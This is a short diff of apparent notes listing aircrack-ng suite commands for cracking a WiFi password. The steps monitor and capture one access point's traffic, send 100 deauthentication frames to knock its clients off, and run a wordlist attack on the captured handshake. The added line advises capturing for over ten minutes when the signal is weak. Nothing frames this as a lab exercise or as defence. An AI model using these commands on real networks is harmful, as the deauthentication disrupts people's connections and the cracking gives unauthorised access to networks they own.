@@ -8,6 +8,9 @@ $ sudo airodump-ng wlp2s0mon
 FC:5A:1D:9A:7E:A8  is a AccessPoint MAC 
 
 $ sudo airodump-ng --bssid FC:5A:1D:9A:7E:A8 -c 11 -w Daniella wlp2s0mon
+
+Do this process more than 10 minutos or more if there are less signal
+
 $ sudo aireplay-ng --deauth 100 -a FC:5A:1D:9A:7E:A8 wlp2s0mon --ignore-negative-one
 $ sudo aircrack-ng Daniella-01.cap -w password.lst
 $ sudo airmon-ng stop wlp2s0mon
